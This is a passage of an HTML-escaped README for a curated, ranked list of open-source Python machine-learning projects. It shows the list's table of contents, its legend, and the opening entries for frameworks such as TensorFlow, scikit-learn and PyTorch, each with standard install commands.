newsletter&#34;&gt;&lt;img src=&#34;http://bit.ly/2Md9rxM&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/mltooling&#34; title=&#34;Follow on Twitter&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/mltooling.svg?style=social&amp;amp;label=Follow&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;This curated list contains 900 awesome open-source projects with a total of 3.4M stars grouped into 34 categories. All projects are ranked by a project-quality score, which is calculated based on various metrics automatically collected from GitHub and different package managers. If you like to add or update projects, feel free to open an &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/issues/new/choose&#34;&gt;issue&lt;/a&gt;, submit a &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/pulls&#34;&gt;pull request&lt;/a&gt;, or directly edit the &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/edit/main/projects.yaml&#34;&gt;projects.yaml&lt;/a&gt;. Contributions are very welcome!&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p align=&#34;center&#34;&gt; 🧙‍♂️&amp;nbsp; Discover other &lt;a href=&#34;https://best-of.org&#34;&gt;best-of lists&lt;/a&gt; or create &lt;a href=&#34;https://github.com/best-of-lists/best-of/raw/main/create-best-of-list.md&#34;&gt;your own&lt;/a&gt;.&lt;br&gt; 📫&amp;nbsp; Subscribe to our &lt;a href=&#34;https://mltooling.substack.com/subscribe&#34;&gt;newsletter&lt;/a&gt; for updates and trending projects. &lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#machine-learning-frameworks&#34;&gt;Machine Learning Frameworks&lt;/a&gt; &lt;em&gt;56 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#data-visualization&#34;&gt;Data Visualization&lt;/a&gt; &lt;em&gt;51 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#text-data--nlp&#34;&gt;Text Data &amp;amp; NLP&lt;/a&gt; &lt;em&gt;96 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#image-data&#34;&gt;Image Data&lt;/a&gt; &lt;em&gt;60 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#graph-data&#34;&gt;Graph Data&lt;/a&gt; &lt;em&gt;36 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#audio-data&#34;&gt;Audio Data&lt;/a&gt; &lt;em&gt;28 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#geospatial-data&#34;&gt;Geospatial Data&lt;/a&gt; &lt;em&gt;22 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#financial-data&#34;&gt;Financial Data&lt;/a&gt; &lt;em&gt;25 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#time-series-data&#34;&gt;Time Series Data&lt;/a&gt; &lt;em&gt;26 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#medical-data&#34;&gt;Medical Data&lt;/a&gt; &lt;em&gt;19 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#tabular-data&#34;&gt;Tabular Data&lt;/a&gt; &lt;em&gt;5 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#optical-character-recognition&#34;&gt;Optical Character Recognition&lt;/a&gt; &lt;em&gt;12 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#data-containers--structures&#34;&gt;Data Containers &amp;amp; Structures&lt;/a&gt; &lt;em&gt;0 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#data-loading--extraction&#34;&gt;Data Loading &amp;amp; Extraction&lt;/a&gt; &lt;em&gt;2 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#web-scraping--crawling&#34;&gt;Web Scraping &amp;amp; Crawling&lt;/a&gt; &lt;em&gt;1 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#data-pipelines--streaming&#34;&gt;Data Pipelines &amp;amp; Streaming&lt;/a&gt; &lt;em&gt;43 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#distributed-machine-learning&#34;&gt;Distributed Machine Learning&lt;/a&gt; &lt;em&gt;33 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#hyperparameter-optimization--automl&#34;&gt;Hyperparameter Optimization &amp;amp; AutoML&lt;/a&gt; &lt;em&gt;47 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#reinforcement-learning&#34;&gt;Reinforcement Learning&lt;/a&gt; &lt;em&gt;23 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#recommender-systems&#34;&gt;Recommender Systems&lt;/a&gt; &lt;em&gt;16 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#privacy-machine-learning&#34;&gt;Privacy Machine Learning&lt;/a&gt; &lt;em&gt;6 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#workflow--experiment-tracking&#34;&gt;Workflow &amp;amp; Experiment Tracking&lt;/a&gt; &lt;em&gt;39 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#model-serialization--deployment&#34;&gt;Model Serialization &amp;amp; Deployment&lt;/a&gt; &lt;em&gt;16 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#model-interpretability&#34;&gt;Model Interpretability&lt;/a&gt; &lt;em&gt;52 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#vector-similarity-search-ann&#34;&gt;Vector Similarity Search (ANN)&lt;/a&gt; &lt;em&gt;12 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#probabilistics--statistics&#34;&gt;Probabilistics &amp;amp; Statistics&lt;/a&gt; &lt;em&gt;22 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#adversarial-robustness&#34;&gt;Adversarial Robustness&lt;/a&gt; &lt;em&gt;9 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#gpu-utilities&#34;&gt;GPU Utilities&lt;/a&gt; &lt;em&gt;18 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#tensorflow-utilities&#34;&gt;Tensorflow Utilities&lt;/a&gt; &lt;em&gt;15 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#jax-utilities&#34;&gt;Jax Utilities&lt;/a&gt; &lt;em&gt;2 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#sklearn-utilities&#34;&gt;Sklearn Utilities&lt;/a&gt; &lt;em&gt;17 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#pytorch-utilities&#34;&gt;Pytorch Utilities&lt;/a&gt; &lt;em&gt;32 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#database-clients&#34;&gt;Database Clients&lt;/a&gt; &lt;em&gt;1 projects&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#others&#34;&gt;Others&lt;/a&gt; &lt;em&gt;61 projects&lt;/em&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Explanation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;🥇🥈🥉&amp;nbsp; Combined project-quality score&lt;/li&gt; &#xA; &lt;li&gt;⭐️&amp;nbsp; Star count from GitHub&lt;/li&gt; &#xA; &lt;li&gt;🐣&amp;nbsp; New project &lt;em&gt;(less than 6 months old)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;💤&amp;nbsp; Inactive project &lt;em&gt;(6 months no activity)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;💀&amp;nbsp; Dead project &lt;em&gt;(12 months no activity)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;📈📉&amp;nbsp; Project is trending up or down&lt;/li&gt; &#xA; &lt;li&gt;➕&amp;nbsp; Project was recently added&lt;/li&gt; &#xA; &lt;li&gt;❗️&amp;nbsp; Warning &lt;em&gt;(e.g. missing/risky license)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;👨‍💻&amp;nbsp; Contributors count from GitHub&lt;/li&gt; &#xA; &lt;li&gt;🔀&amp;nbsp; Fork count from GitHub&lt;/li&gt; &#xA; &lt;li&gt;📋&amp;nbsp; Issue count from GitHub&lt;/li&gt; &#xA; &lt;li&gt;⏱️&amp;nbsp; Last update timestamp on package manager&lt;/li&gt; &#xA; &lt;li&gt;📥&amp;nbsp; Download count from package manager&lt;/li&gt; &#xA; &lt;li&gt;📦&amp;nbsp; Number of dependent projects&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; Tensorflow related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; Sklearn related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; PyTorch related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; MxNet related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; Apache Spark related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; Jupyter related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; PaddlePaddle related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; Pandas related project&lt;/li&gt; &#xA; &lt;li&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&amp;nbsp; Jax related project&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Machine Learning Frameworks&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;General-purpose machine learning and deep learning frameworks.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/tensorflow&#34;&gt;Tensorflow&lt;/a&gt;&lt;/b&gt; (🥇55 · ⭐ 170K) - An Open Source Machine Learning Framework for Everyone. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/tensorflow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4K · 🔀 87K · 📦 200K · 📋 35K - 6% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/tensorflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow&#34;&gt;PyPi&lt;/a&gt; (📥 17M / month · 📦 14K · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorflow&#34;&gt;Conda&lt;/a&gt; (📥 3.3M · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/tensorflow/tensorflow&#34;&gt;Docker Hub&lt;/a&gt; (📥 66M · ⭐ 2K · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull tensorflow/tensorflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-learn/scikit-learn&#34;&gt;scikit-learn&lt;/a&gt;&lt;/b&gt; (🥇51 · ⭐ 50K) - scikit-learn: machine learning in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-learn/scikit-learn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2.6K · 🔀 23K · 📥 800 · 📦 350K · 📋 10K - 22% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-learn/scikit-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-learn&#34;&gt;PyPi&lt;/a&gt; (📥 34M / month · 📦 25K · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/scikit-learn&#34;&gt;Conda&lt;/a&gt; (📥 13M · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge scikit-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/pytorch&#34;&gt;PyTorch&lt;/a&gt;&lt;/b&gt; (🥇49 · ⭐ 56K) - Tensors and Dynamic neural networks in Python with strong GPU.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/pytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 3.3K · 🔀 16K · 📥 3.5K · 📋 28K - 35% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torch&#34;&gt;PyPi&lt;/a&gt; (📥 9.3M / month · 📦 7K · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/pytorch/pytorch&#34;&gt;Conda&lt;/a&gt; (📥 17M · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c pytorch pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/keras-team/keras&#34;&gt;Keras&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 55K) - Deep Learning for humans. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/keras-team/keras&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.1K · 🔀 19K · 📋 11K - 2% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/keras-team/keras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/keras&#34;&gt;PyPi&lt;/a&gt; (📥 10M / month · 📦 300 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install keras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/keras&#34;&gt;Conda&lt;/a&gt; (📥 2.3M · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge keras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dmlc/xgboost&#34;&gt;XGBoost&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 23K) - Scalable, Portable and Distributed Gradient Boosting (GBDT, GBRT or.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dmlc/xgboost&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 560 · 🔀 8.4K · 📥 4.2K · 📦 31K · 📋 4.4K - 6% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dmlc/xgboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/xgboost&#34;&gt;PyPi&lt;/a&gt; (📥 9.9M / month · 📦 1.3K · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install xgboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/xgboost&#34;&gt;Conda&lt;/a&gt; (📥 2.6M · ⏱️ 17.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge xgboost&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/jax&#34;&gt;jax&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 18K) - Composable transformations of Python+NumPy programs: differentiate,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/jax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 400 · 🔀 1.6K · 📦 4.4K · 📋 3.3K - 32% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/jax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/jax&#34;&gt;PyPi&lt;/a&gt; (📥 440K / month · 📦 300 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install jax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/jaxlib&#34;&gt;Conda&lt;/a&gt; (📥 320K · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge jaxlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PyTorchLightning/pytorch-lightning&#34;&gt;pytorch-lightning&lt;/a&gt;&lt;/b&gt; (🥈43 · ⭐ 19K) - The lightweight PyTorch wrapper for high-performance.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PyTorchLightning/pytorch-lightning&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 680 · 🔀 2.3K · 📥 6.8K · 📦 9.1K · 📋 5K - 9% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PyTorchLightning/pytorch-lightning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-lightning&#34;&gt;PyPi&lt;/a&gt; (📥 3.8M / month · 📦 360 · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-lightning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch-lightning&#34;&gt;Conda&lt;/a&gt; (📥 440K · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch-lightning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/statsmodels/statsmodels&#34;&gt;StatsModels&lt;/a&gt;&lt;/b&gt; (🥈43 · ⭐ 7.4K) - Statsmodels: statistical modeling and econometrics in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/statsmodels/statsmodels&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 370 · 🔀 2.4K · 📥 26 · 📦 64K · 📋 4.8K - 47% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/statsmodels/statsmodels&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/statsmodels&#34;&gt;PyPi&lt;/a&gt; (📥 11M / month · 📦 4.5K · ⏱️ 08.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install statsmodels&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/statsmodels&#34;&gt;Conda&lt;/a&gt; (📥 6.2M · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge statsmodels&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apache/spark&#34;&gt;PySpark&lt;/a&gt;&lt;/b&gt; (🥈42 · ⭐ 33K) - Apache Spark Python API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apache/spark&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2.7K · 🔀 26K · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apache/spark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyspark&#34;&gt;PyPi&lt;/a&gt; (📥 21M / month · 📦 830 · 